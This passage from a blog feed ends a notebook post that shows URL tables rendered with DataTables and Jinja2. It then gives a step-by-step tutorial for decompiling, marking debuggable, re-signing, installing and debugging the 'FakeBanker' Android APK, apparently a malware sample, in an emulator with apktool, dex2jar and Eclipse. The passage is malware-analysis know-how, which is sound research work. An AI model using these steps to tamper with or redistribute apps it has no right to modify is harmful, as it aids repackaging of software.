      <td>      www.richardsonscharts.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>5 </th>
      <td> http</td>
      <td> </td>
      <td>                 www.xenith.net</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>6 </th>
      <td> http</td>
      <td> </td>
      <td>             www.tdbrecords.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>7 </th>
      <td> http</td>
      <td> </td>
      <td>   www.electrichumanproject.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>8 </th>
      <td> http</td>
      <td> </td>
      <td>      tweekerchick.blogspot.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>9 </th>
      <td> http</td>
      <td> </td>
      <td>                www.besound.com</td>
      <td> </td>
      <td> /pushead/home.html</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>10</th>
      <td> http</td>
      <td> </td>
      <td> www.porkchopscreenprinting.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>11</th>
      <td> http</td>
      <td> </td>
      <td>           www.kinseyvisual.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>12</th>
      <td> http</td>
      <td> </td>
      <td>             www.rathergood.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>13</th>
      <td> http</td>
      <td> </td>
      <td>                 www.lepoint.fr</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>14</th>
      <td> http</td>
      <td> </td>
      <td>                  www.revhq.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>15</th>
      <td> http</td>
      <td> </td>
      <td>        www.poprocksandcoke.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>16</th>
      <td> http</td>
      <td> </td>
      <td>            www.samuraiblue.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>17</th>
      <td> http</td>
      <td> </td>
      <td>                www.openbsd.org</td>
      <td> </td>
      <td>   /cgi-bin/man.cgi</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>18</th>
      <td> http</td>
      <td> </td>
      <td>                www.sysblog.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>19</th>
      <td> http</td>
      <td> </td>
      <td>         www.voicesofsafety.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
  </tbody>
</table>
</div>
<h3 id="jquery-datatables-output">JQuery DataTables output</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">DataTable(df_targets[:20])
</code></pre></div><pre><code>    &lt;div id=&quot;datatable-container-aab341ae-2f8d-11e4-95d5-52540086692e&quot;&gt;
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.9.0/css/jquery.dataTables.css&quot;&gt;
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.9.0/css/jquery.dataTables_themeroller.css&quot;&gt;
        &lt;script type=&quot;text/javascript&quot; charset=&quot;utf8&quot; src=&quot;http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.9.0/jquery.dataTables.min.js&quot;&gt;&lt;/script&gt;

        &lt;script type=&quot;text/javascript&quot;&gt;
            var url = window.location.href;

            if(url.indexOf(&quot;localhost:9999&quot;) != -1){
                $('#datatable-container-aab341ae-2f8d-11e4-95d5-52540086692e table.datatable').dataTable();
            } else {
                $.getScript(&quot;http://code.jquery.com/jquery-1.11.1.min.js&quot;);
                $(document).ready(function() {
                    $('#datatable-container-aab341ae-2f8d-11e4-95d5-52540086692e table.datatable').dataTable();
                });
            }

        &lt;/script&gt;
        &lt;!-- Insert table below --&gt;
        &lt;table border=&quot;1&quot; class=&quot;dataframe datatable dataframe&quot;&gt;
</code></pre>
  <thead>
    <tr style="text-align: right;">
      <th>scheme</th>
      <th>userinfo</th>
      <th>host</th>
      <th>port</th>
      <th>path</th>
      <th>query</th>
      <th>fragment</th>
      <th>decoded</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td> http</td>
      <td> </td>
      <td>               www.altpress.org</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>           www.nzfortress.co.nz</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>         www.evillasforsale.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>           www.playingenemy.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>      www.richardsonscharts.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                 www.xenith.net</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>             www.tdbrecords.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>   www.electrichumanproject.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>      tweekerchick.blogspot.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                www.besound.com</td>
      <td> </td>
      <td> /pushead/home.html</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td> www.porkchopscreenprinting.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>           www.kinseyvisual.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>             www.rathergood.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                 www.lepoint.fr</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                  www.revhq.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>        www.poprocksandcoke.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>            www.samuraiblue.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                www.openbsd.org</td>
      <td> </td>
      <td>   /cgi-bin/man.cgi</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                www.sysblog.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>         www.voicesofsafety.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
  </tbody>
</table>
        </div>
<h3 id="jinja2-cellmagic">Jinja2 cellmagic</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">html_output = DataTable(df_targets[:20])
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">%%jinja html
&lt;div id=&#34;table-container&#34;&gt;
    {{ html_output }}
&lt;/div&gt;
</code></pre></div><div id="table-container">
    <IPython.core.display.HTML object at 0x7f042eaa02d0>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">html_output
</code></pre></div><pre><code>    &lt;div id=&quot;datatable-container-3b6a2692-2f8c-11e4-95d5-52540086692e&quot;&gt;
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.9.0/css/jquery.dataTables.css&quot;&gt;
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.9.0/css/jquery.dataTables_themeroller.css&quot;&gt;
        &lt;script type=&quot;text/javascript&quot; charset=&quot;utf8&quot; src=&quot;http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.9.0/jquery.dataTables.min.js&quot;&gt;&lt;/script&gt;

        &lt;script type=&quot;text/javascript&quot;&gt;
            $('#datatable-container-3b6a2692-2f8c-11e4-95d5-52540086692e table.datatable').dataTable();
        &lt;/script&gt;
        &lt;!-- Insert table below --&gt;
        &lt;table border=&quot;1&quot; class=&quot;dataframe datatable dataframe&quot;&gt;
</code></pre>
  <thead>
    <tr style="text-align: right;">
      <th>scheme</th>
      <th>userinfo</th>
      <th>host</th>
      <th>port</th>
      <th>path</th>
      <th>query</th>
      <th>fragment</th>
      <th>decoded</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td> http</td>
      <td> </td>
      <td>               www.altpress.org</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>           www.nzfortress.co.nz</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>         www.evillasforsale.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>           www.playingenemy.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>      www.richardsonscharts.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                 www.xenith.net</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>             www.tdbrecords.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>   www.electrichumanproject.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>      tweekerchick.blogspot.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                www.besound.com</td>
      <td> </td>
      <td> /pushead/home.html</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td> www.porkchopscreenprinting.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>           www.kinseyvisual.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>             www.rathergood.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                 www.lepoint.fr</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                  www.revhq.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>        www.poprocksandcoke.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>            www.samuraiblue.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                www.openbsd.org</td>
      <td> </td>
      <td>   /cgi-bin/man.cgi</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>                www.sysblog.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <td> http</td>
      <td> </td>
      <td>         www.voicesofsafety.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
  </tbody>
</table>
        </div>
<p>Easy isn&rsquo;t it? Thx for sharing.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Debug Android APKs with Eclipse and DDMS</title>
      <link>https://blog.dornea.nu/2014/08/21/howto-debug-android-apks-with-eclipse-and-ddms/</link>
      <pubDate>Thu, 21 Aug 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/08/21/howto-debug-android-apks-with-eclipse-and-ddms/</guid>
      <content:encoded><![CDATA[<p>Simply out of necessity I&rsquo;ve written this mini-tutorial how debug android APKs using Eclipse and <a href="http://developer.android.com/tools/debugging/ddms.html">DDMS</a>.
After hours of wild googling these are the steps to make your APK debuggable under Eclipse. I&rsquo;ll be using the <code>FakeBanker</code> APK reverse-engineered in previous <a href="http://blog.dornea.nu/tag/android/">articles</a>.</p>
<h2 id="revisions">Revisions</h2>
<ul>
<li><em><strong>UPDATE 2014-12-09</strong></em>:</li>
</ul>
<p>Before looking at the next steps, make sure you&rsquo;ll have a look at <a href="http://adus.dev.dornea.nu/">ADUS</a>. It will help you with the automation of several steps described in this post. Added some additional infos regarding the breakpoints.</p>
<h2 id="dump-the-apk">Dump the APK</h2>
<p>First of all make sure you&rsquo;ll have the latest version of <code>apktool</code>. I&rsquo;ve compiled it by myself:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
<span style="color:#999;font-style:italic"># git clone git://github.com/iBotPeaches/Apktool.git</span>
oCloning into <span style="color:#ed9d13">&#39;Apktool&#39;</span>...    
remote: Counting objects: 9605, <span style="color:#6ab825;font-weight:bold">done</span>.
remote: Compressing objects: 100% (3622/3622), <span style="color:#6ab825;font-weight:bold">done</span>.
remote: Total <span style="color:#3677a9">9605</span> (delta 4556), reused <span style="color:#3677a9">9494</span> (delta 4502)
Receiving objects: 100% (9605/9605), 34.27 MiB | 3.89 MiB/s, <span style="color:#6ab825;font-weight:bold">done</span>.
Resolving deltas: 100% (4556/4556), <span style="color:#6ab825;font-weight:bold">done</span>.
Checking connectivity... <span style="color:#6ab825;font-weight:bold">done</span>.

<span style="color:#999;font-style:italic"># cd Apktool</span>
<span style="color:#999;font-style:italic"># ./gradlew build fatJar</span>
[o...]
</code></pre></div><p>Afterwards you&rsquo;ll get a new fresh <code>apktool</code> to use within the next steps:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># find . -name &#34;apktool-cli.jar&#34;</span>
./obrut.apktool/apktool-cli/build/libs/apktool-cli.jar

<span style="color:#999;font-style:italic"># cp ./brut.apktool/apktool-cli/build/libs/apktool-cli.jar /tmp</span>
</code></pre></div><p>After having installed the right tool it&rsquo;s time to dump the APK contents:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># java -jar /tmp/apktool-cli.jar d -d FakeBanker.apk -o source</span>
I: Using Apktool 2.0.0-3d2e93-SNAPSHOT on FakeBanker.apk
I: Loading resource table...
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/victor/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
</code></pre></div><p>Afterwards I got following file structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">tree -L <span style="color:#3677a9">2</span> <span style="color:#24909d">source</span> 
<span style="color:#24909d">source</span>
â”œâ”€â”€ AndroidManifest.xml
â”œâ”€â”€ apktool.yml
â”œâ”€â”€ original
â”‚Â Â  â”œâ”€â”€ AndroidManifest.xml
â”‚Â Â  â””â”€â”€ META-INF
â”œâ”€â”€ res
â”‚Â Â  â”œâ”€â”€ drawable-hdpi
â”‚Â Â  â”œâ”€â”€ drawable-ldpi
â”‚Â Â  â”œâ”€â”€ drawable-mdpi
â”‚Â Â  â”œâ”€â”€ drawable-xhdpi
â”‚Â Â  â”œâ”€â”€ layout
â”‚Â Â  â”œâ”€â”€ menu
â”‚Â Â  â”œâ”€â”€ raw
â”‚Â Â  â””â”€â”€ values
â””â”€â”€ smali
    â”œâ”€â”€ android
    â””â”€â”€ com

<span style="color:#3677a9">14</span> directories, <span style="color:#3677a9">3</span> files
</code></pre></div><h2 id="make-apk-debuggable">Make APK debuggable</h2>
<p>After dumping the APK now you&rsquo;ll have to mark your APK as debuggable. There are several ways in order to achieve that:</p>
<ul>
<li>manually</li>
<li>using apktool</li>
</ul>
<p>If you want to do it manually open the <code>AndroidManifest.xml</code> file and search for the <code>application</code> tag. Then insert new attribute <code>android:debuggable='true'</code> like I did:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">...
<span style="color:#6ab825;font-weight:bold">&lt;application</span> <span style="color:#bbb">android:theme=</span><span style="color:#ed9d13">&#34;@style/AppTheme&#34;</span> <span style="color:#bbb">android:label=</span><span style="color:#ed9d13">&#34;@string/app_name&#34;</span> <span style="color:#bbb">android:icon=</span><span style="color:#ed9d13">&#34;@drawable/ic_launcher1&#34;</span> <span style="color:#bbb">android:debuggable=</span><span style="color:#ed9d13">&#34;true&#34;</span> <span style="color:#bbb">android:allowBackup=</span><span style="color:#ed9d13">&#34;false&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
...
</code></pre></div><h2 id="build-new-app">Build new APP</h2>
<p>Now you&rsquo;re ready to build you new debuggable APK using <code>apktool</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">java -jar /tmp/apktool-cli.jar b -d <span style="color:#24909d">source</span> FakeBanker.Debug.apk
I: Using Apktool 2.0.0-3d2e93-SNAPSHOT on <span style="color:#24909d">source</span>
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether resources has changed...
I: Building resources...
Warning: AndroidManifest.xml already defines debuggable (in http://schemas.android.com/apk/res/android); using existing value in manifest.
I: Building apk file...
</code></pre></div><p>A few explanations regarding the parameters:</p>
<ul>
<li><code>b</code>
<ul>
<li>run apktool in <strong>build</strong> mode</li>
</ul>
</li>
<li><code>-d</code>
<ul>
<li>make APK debuggable (this is the 2nd way I was previously talking about)</li>
</ul>
</li>
</ul>
<h2 id="extract-sources">Extract sources</h2>
<p>I&rsquo;ll be using <code>jd-gui</code> to <strong>undex</strong> the dex files inside the newly created package. First let&rsquo;s unpack <code>FakeBanker.Debug.apk</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># unzip FakeBanker.Debug.apk -d unpacked</span>
Archive:  FakeBanker.Debug.apk
 extracting: unpacked/res/drawable-hdpi/ic_launcher1.png  
 extracting: unpacked/res/drawable-hdpi/logo.png  
 extracting: unpacked/res/drawable-ldpi/ic_launcher1.png  
 extracting: unpacked/res/drawable-mdpi/ic_launcher1.png  
 extracting: unpacked/res/drawable-xhdpi/ic_launcher1.png  
  inflating: unpacked/res/layout/actup.xml  
  inflating: unpacked/res/layout/main.xml  
  inflating: unpacked/res/layout/main2.xml  
  inflating: unpacked/res/menu/main.xml  
 extracting: unpacked/res/raw/blfs.key  
  inflating: unpacked/res/raw/config.cfg  
  inflating: unpacked/AndroidManifest.xml  
  inflating: unpacked/classes.dex    
  inflating: unpacked/resources.arsc  
</code></pre></div><p>Let <code>dex2jar</code> do its job:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># cd unpacked</span>
<span style="color:#999;font-style:italic"># dex2jar classes.dex</span>
dex2jar classes.dex -&gt; classes-dex2jar.jar
</code></pre></div><p>Now open the jar file using <code>jd-gui</code> and save the sources as zip like I did:</p>
<p><img src="/posts/img/2014/eclipse-ddms/jd-gui.png" alt=""></p>
<h2 id="sign-the-apk">Sign the APK</h2>
<p>In order to push your APK to the device you&rsquo;ll have to <strong>sign</strong> it. I&rsquo;ll therefor using a test <a href="http://developer.android.com/tools/publishing/app-signing.html">certificate</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># git clone https://github.com/appium/sign</span>
Cloning into <span style="color:#ed9d13">&#39;sign&#39;</span>...
remote: Counting objects: 49, <span style="color:#6ab825;font-weight:bold">done</span>.
remote: Total <span style="color:#3677a9">49</span> (delta 0), reused <span style="color:#3677a9">0</span> (delta 0)
Unpacking objects: 100% (49/49), <span style="color:#6ab825;font-weight:bold">done</span>.
Checking connectivity... <span style="color:#6ab825;font-weight:bold">done</span>.
</code></pre></div><p>Now let&rsquo;s sign it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># java -jar sign/dist/signapk.jar sign/testkey.x509.pem sign/testkey.pk8 FakeBanker.Debug.apk FakeBanker.Debug.Signed.apk          </span>
</code></pre></div><h2 id="install-the-apk">Install the APK</h2>
<p>Having signed the APK now you&rsquo;re ready to push it to your device and have some fun.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># adb devices -l  </span>
List of devices attached 
emulator-5554          device product:sdk model:sdk device:generic

<span style="color:#999;font-style:italic"># adb install FakeBanker.Debug.Signed.apk</span>
<span style="color:#3677a9">1628</span> KB/s (<span style="color:#3677a9">219033</span> bytes in 0.131s)
    pkg: /data/local/tmp/FakeBanker.Debug.Signed.apk
Success
</code></pre></div><p><img src="/posts/img/2014/eclipse-ddms/app_installed.png" alt=""></p>
<h2 id="add-sources">Add sources</h2>
<p>We&rsquo;ll add the Java sources to the <code>source</code> directory structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># mkdir source/src</span>
<span style="color:#999;font-style:italic"># unzip classes-dex2jar.src.zip -d source/src </span>
Archive:  classes-dex2jar.src.zip
   creating: source/src/android/
   creating: source/src/android/support/
...
</code></pre></div><p>The new directory structure will be:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># tree -L 2 source </span>
<span style="color:#24909d">source</span>
â”œâ”€â”€ AndroidManifest.xml
â”œâ”€â”€ apktool.yml
â”œâ”€â”€ bin
â”‚Â Â  â”œâ”€â”€ android
â”‚Â Â  â””â”€â”€ com
â”œâ”€â”€ build
â”‚Â Â  â””â”€â”€ apk
â”œâ”€â”€ dist
â”‚Â Â  â””â”€â”€ FakeBanker.apk
â”œâ”€â”€ original
â”‚Â Â  â”œâ”€â”€ AndroidManifest.xml
â”‚Â Â  â””â”€â”€ META-INF
â”œâ”€â”€ res
â”‚Â Â  â”œâ”€â”€ drawable-hdpi
â”‚Â Â  â”œâ”€â”€ drawable-ldpi
â”‚Â Â  â”œâ”€â”€ drawable-mdpi
â”‚Â Â  â”œâ”€â”€ drawable-xhdpi
â”‚Â Â  â”œâ”€â”€ layout
â”‚Â Â  â”œâ”€â”€ menu
â”‚Â Â  â”œâ”€â”€ raw
â”‚Â Â  â””â”€â”€ values
â”œâ”€â”€ smali
â”‚Â Â  â”œâ”€â”€ android
â”‚Â Â  â””â”€â”€ com
â””â”€â”€ src
    â”œâ”€â”€ android
    â””â”€â”€ com

<span style="color:#3677a9">23</span> directories, <span style="color:#3677a9">4</span> files
</code></pre></div><h2 id="debug-settings">Debug settings</h2>
<p>I had to active the debug settings for my targeted app. Go to <code>Device Settings</code> -&gt; <code>Select debug app</code>. Also make sure you have <code>Wait for debugger</code> activated.
This will prevent your app starting before any debugger gets connected to it.</p>
<p><img src="/posts/img/2014/eclipse-ddms/app_select_debug_app.png" alt=""></p>
<h2 id="setup-eclipse">Setup Eclipse</h2>
<p>First of all make sure you have the <a href="http://developer.android.com/tools/sdk/eclipse-adt.html">ADT</a> along with the <a href="http://developer.android.com/sdk/index.html">Android SDK</a> installed. Now let&rsquo;s move on:</p>
<h4 id="create-new-java-project">Create new Java project</h4>
<p>First create a new <em>Java</em> project and use <code>source</code> as the location of the project.</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_create_java_project.png" alt=""></p>
<h4 id="add-src-folder-to-build-path">Add src folder to build path</h4>
<p>Make sure the <code>src</code> folder is added as a source location to the build path.</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_project_src.png" alt=""></p>
<h4 id="check-project-properties">Check project properties</h4>
<p>You could also check the project properties by clicking on it and then <code>ALT+Enter</code>. You should have sth similar to:</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_project_properties_build_path.png" alt=""></p>
<h2 id="set-breakpoints">Set breakpoints</h2>
<p>Having set up the Eclipse environment let&rsquo;s add some breakpoints.</p>
<h3 id="update-2014-12-09">UPDATE 2014-12-09</h3>
<p><strong>Important note</strong>: As stated <a href="https://code.google.com/p/android-apktool/wiki/SmaliDebugging">here</a> you should pay attention <strong>where</strong> you set your breakpoint:</p>
<blockquote>
<p>You must select line with some instruction, you can&rsquo;t set breakpoint on lines starting with &ldquo;.&rdquo;, &ldquo;:&rdquo; or &ldquo;#&rdquo;.</p>
</blockquote>
<p>So be careful whet choosing your breakpoints otherwise you might ask yourself why your code doesn&rsquo;t get debugged.</p>
<h3 id="debug-oncreate">Debug onCreate</h3>
<p>First search for <strong>onCreate</strong> in all files:</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_search_on_create.png" alt=""></p>
<p>Eclipse found several matches:</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_found_oncreate.png" alt=""></p>
<p>We&rsquo;ll now concentrate on <code>MainActivity.java</code> and set a breakpoint:</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_set_breakpoint.png" alt=""></p>
<p>Switching the perspective to <code>Debug</code> you should be able to see your breakpoints (marked in red):</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_view_breakpoints.png" alt=""></p>
<h2 id="run-application">Run application</h2>
<p>Before running our application we&rsquo;ll have a look at the already running processes on the device:</p>
